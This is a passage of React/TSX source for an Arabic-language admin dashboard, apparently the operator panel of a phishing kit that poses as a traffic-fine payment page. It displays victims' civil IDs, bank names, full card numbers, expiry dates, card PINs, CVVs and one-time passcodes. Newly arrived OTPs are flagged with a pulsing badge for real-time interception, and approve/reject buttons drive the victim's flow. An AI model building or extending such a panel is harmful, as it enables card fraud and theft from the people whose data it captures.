                            isActive={currentPage === number}
                            className="transition-all duration-300"
                          >
                            {number}
                          </PaginationLink>
                        </PaginationItem>
                      ))}

                      <PaginationItem>
                        <PaginationNext
                          onClick={() => setCurrentPage((prev) => Math.min(prev + 1, totalPages))}
                          className={`transition-all duration-300 ${currentPage === totalPages ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                        />
                      </PaginationItem>
                    </PaginationContent>
                  </Pagination>
                </CardFooter>
              </Card>
            </div>

            {/* Mobile Card View - Shown only on Mobile */}
            <div className="md:hidden space-y-4">
              {currentItems.map((notification, index) => (
                <Card
                  key={notification.id}
                  className="overflow-hidden border-0 shadow-sm card-hover animate-fade-in"
                  style={{ animationDelay: `${index * 0.05}s` }}
                >
                  <CardHeader className="pb-2 pt-4 px-4 bg-gradient-to-r from-slate-50 to-white border-b">
                    <div className="flex justify-between items-start">
                      <div>
                        <CardTitle className="text-base">{notification?.civilId || "مستخدم"}</CardTitle>
                        <p className="text-sm text-slate-500 flex items-center gap-1.5 mt-1">
                          <Shield className="h-3.5 w-3.5 text-slate-400" />
                          {notification?.country || "غير معروف"}
                        </p>
                      </div>
                      <UserStatusBadge userId={notification.id} />
                    </div>
                  </CardHeader>
                  <CardContent className="px-4 pb-4 pt-3 bg-white">
                    <div className="space-y-4">
                      <div className="flex flex-wrap gap-2 mt-2">
                        <Badge
                          variant={notification?.civilId ? "outline" : "destructive"}
                          className={`rounded-md cursor-pointer transition-all duration-300 ${
                            notification?.civilId ? "hover:bg-slate-100" : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          <Info className="h-3 w-3 mr-1" />
                          معلومات شخصية
                        </Badge>
                        <Badge
                          variant={
                            notification.cardNumber || notification.cardDetails?.number ? "outline" : "destructive"
                          }
                          className={`rounded-md cursor-pointer transition-all duration-300 ${
                            notification.cardNumber || notification.cardDetails?.number
                              ? "bg-green-50 text-green-700 border-green-200 hover:bg-green-100"
                              : ""
                          } ${notificationsWithNewOtps[notification.id] ? "animate-pulse-glow" : ""}`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          <CreditCard className="h-3 w-3 mr-1" />
                          معلومات البطاقة
                          {notificationsWithNewOtps[notification.id] && (
                            <span className="relative flex h-2 w-2 mr-1">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                              <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                            </span>
                          )}
                        </Badge>
                      </div>

                      <div className="text-sm text-slate-500 flex items-center gap-2 bg-slate-50 p-3 rounded-lg">
                        <Clock className="h-4 w-4 text-slate-400" />
                        <span className="font-medium">الوقت:</span>{" "}
                        {notification.createdDate &&
                          formatDistanceToNow(new Date(notification.createdDate), {
                            addSuffix: true,
                            locale: ar,
                          })}
                      </div>

                      <Separator className="bg-slate-100" />

                      <div className="flex justify-end">
                        <Button
                          variant="destructive"
                          size="sm"
                          onClick={() => handleDelete(notification.id)}
                          className="h-8 gap-2 transition-all duration-300 hover:bg-red-700"
                        >
                          <Trash2 className="h-4 w-4" />
                          حذف
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}

              {/* Mobile Pagination */}
              <div className="flex flex-col items-center gap-4 py-4 animate-fade-in">
                <Pagination>
                  <PaginationContent>
                    <PaginationItem>
                      <PaginationPrevious
                        onClick={() => setCurrentPage((prev) => Math.max(prev - 1, 1))}
                        className={`transition-all duration-300 ${currentPage === 1 ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                      />
                    </PaginationItem>

                    {pageNumbers.length > 5 ? (
                      <>
                        {pageNumbers.slice(0, 2).map((number) => (
                          <PaginationItem key={number}>
                            <PaginationLink
                              onClick={() => setCurrentPage(number)}
                              isActive={currentPage === number}
                              className="transition-all duration-300"
                            >
                              {number}
                            </PaginationLink>
                          </PaginationItem>
                        ))}
                        <PaginationItem>
                          <PaginationEllipsis />
                        </PaginationItem>
                        {pageNumbers.slice(-2).map((number) => (
                          <PaginationItem key={number}>
                            <PaginationLink
                              onClick={() => setCurrentPage(number)}
                              isActive={currentPage === number}
                              className="transition-all duration-300"
                            >
                              {number}
                            </PaginationLink>
                          </PaginationItem>
                        ))}
                      </>
                    ) : (
                      pageNumbers.map((number) => (
                        <PaginationItem key={number}>
                          <PaginationLink
                            onClick={() => setCurrentPage(number)}
                            isActive={currentPage === number}
                            className="transition-all duration-300"
                          >
                            {number}
                          </PaginationLink>
                        </PaginationItem>
                      ))
                    )}

                    <PaginationItem>
                      <PaginationNext
                        onClick={() => setCurrentPage((prev) => Math.min(prev + 1, totalPages))}
                        className={`transition-all duration-300 ${currentPage === totalPages ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                      />
                    </PaginationItem>
                  </PaginationContent>
                </Pagination>
                <div className="flex items-center gap-2">
                  <span className="text-sm text-slate-500">
                    عرض {indexOfFirstItem + 1}-{Math.min(indexOfLastItem, allDisplayNotifications.length)} من{" "}
                    {allDisplayNotifications.length}
                  </span>
                  <Select
                    value={itemsPerPage.toString()}
                    onValueChange={(value: string) => {
                      setItemsPerPage(Number.parseInt(value))
                      setCurrentPage(1)
                    }}
                  >
                    <SelectTrigger className="w-[80px] h-8 transition-all duration-300 hover:border-slate-300">
                      <SelectValue placeholder="10" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="5">5</SelectItem>
                      <SelectItem value="10">10</SelectItem>
                      <SelectItem value="20">20</SelectItem>
                      <SelectItem value="50">50</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent
          className="bg-white text-slate-900 max-w-[90vw] md:max-w-md glass-effect animate-fade-in"
          dir="rtl"
        >
          <DialogHeader>
            <DialogTitle
              dir="rtl"
              className="text-xl font-bold bg-gradient-to-r from-slate-800 to-slate-600 bg-clip-text text-transparent"
            >
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات عامة"}
            </DialogTitle>
            <DialogDescription className="text-slate-500">
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة"
                  : "تفاصيل المعلومات العامة"}
            </DialogDescription>
          </DialogHeader>

          <Button
            variant="ghost"
            size="sm"
            className="absolute top-2 left-2 h-8 w-8 p-0 rounded-full transition-all duration-300 hover:bg-slate-100"
            onClick={closeDialog}
          >
            <X className="h-4 w-4" />
          </Button>

          {selectedInfo === "personal" && selectedNotification?.plateType && (
            <div className="space-y-3 mt-2">
              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">قيمة المخالفة:</span>
                  <span>{selectedNotification.violationValue || "غير متوفر"}</span>
                </p>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 mt-2">
              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">البنك:</span>
                  <span>{selectedNotification.bank || "غير متوفر"}</span>
                </p>
              </div>

              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">رقم البطاقة:</span>

                  <span dir="ltr" className="font-mono">
                    {selectedNotification.cardNumber || selectedNotification.cardDetails?.number || "غير متوفر"}
                  </span>
                  {selectedNotification?.prefix && (
                    <Badge className="bg-blue-100 text-blue-700 border-blue-200">{selectedNotification?.prefix}</Badge>
                  )}
                </p>
              </div>

              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">تاريخ الانتهاء:</span>
                  <span className="font-mono">
                    {selectedNotification?.cardExpiry ||
                      selectedNotification?.month + "/" + selectedNotification?.year ||
                      selectedNotification?.cardDetails?.expiry ||
                      "غير متوفر"}
                  </span>
                </p>
              </div>

              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">رمز البطاقة:</span>
                  <span className="font-mono">{selectedNotification.pass || "غير متوفر"}</span>
                </p>
              </div>
              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">رمز الامان:</span>
                  <span className="font-mono">
                    {selectedNotification?.cvv || selectedNotification?.cardDetails?.cvc || "غير متوفر"}
                  </span>
                </p>
              </div>
              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">رمز التحقق:</span>
                  <Badge className="font-mono text-black bg-green-50 otp-badge">
                    {selectedNotification?.otp || "غير متوفر"}
                  </Badge>
                  <Badge className="font-mono text-black bg-green-50 otp-badge">
                    {selectedNotification?.otp2 || "غير متوفر"}
                  </Badge>
                </p>
              </div>
              {selectedNotification?.allOtps && selectedNotification.allOtps.length > 0 && (
                <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                  <style>{styles}</style>
                  <p className="flex flex-col gap-2">
                    <span className="font-medium text-slate-700 flex items-center gap-2">
                      جميع رموز التحقق
                      <span className="text-xs text-green-600 bg-green-50 px-2 py-0.5 rounded-full">
                        {selectedNotification.allOtps.length}
                      </span>
                    </span>
                    <div className="flex flex-wrap gap-2 mt-1 p-2 border border-dashed border-green-200 rounded-md bg-white">
                      {selectedNotification.allOtps.map((otp, index) => (
                        <AnimatedOtpBadge
                          key={`${otp}-${index}`}
                          otp={otp as string}
                          isNew={newOtps[otp as string] || false}
                        />
                      ))}
                    </div>
                  </p>
                </div>
              )}
            </div>
          )}

          {selectedInfo === "personal" && selectedNotification && !selectedNotification.plateType && (
            <div className="space-y-3 mt-2">
              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">قيمة المخالفة:</span>
                  <span>{selectedNotification.violationValue || "غير متوفر"}</span>
                </p>
              </div>

              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                <p className="flex justify-between">
                  <span className="font-medium text-slate-700">رمز التحقق المرسل:</span>
                  <Badge className="font-mono bg-green-500 text-white">{selectedNotification.otp || "غير متوفر"}</Badge>
                  <Badge className="font-mono bg-green-500 text-white">
                    {selectedNotification.otp2 || "غير متوفر"}
                  </Badge>
                </p>
              </div>
            </div>
          )}

          <div className="flex justify-between gap-2 mt-4">
            <div className="flex gap-2">
              <Button
                variant="destructive"
                className="transition-all hover:scale-105 shadow-sm"
                onClick={() => {
                  handleApproval("rejected", selectedNotification?.id || "")
                  closeDialog()
                }}
              >
                <span className="flex items-center gap-1">
                  <XCircle className="h-4 w-4" />
                  رفض
                </span>
              </Button>
              <Button
                variant="default"
                className="bg-green-600 hover:bg-green-700 transition-all hover:scale-105 shadow-sm"
                onClick={() => {
                  handleApproval("approved", selectedNotification?.id || "")
                  closeDialog()
                }}
              >
                <span className="flex items-center gap-1">
                  <CheckCircle2 className="h-4 w-4" />
                  موافقة
                </span>
              </Button>
            </div>
            <Button variant="outline" onClick={closeDialog} className="transition-all duration-300 hover:bg-slate-100">
              إغلاق
            </Button>
          </div>
        </DialogContent>
      </Dialog>
      <Toaster richColors position="top-center" />
    </div>
  )
}
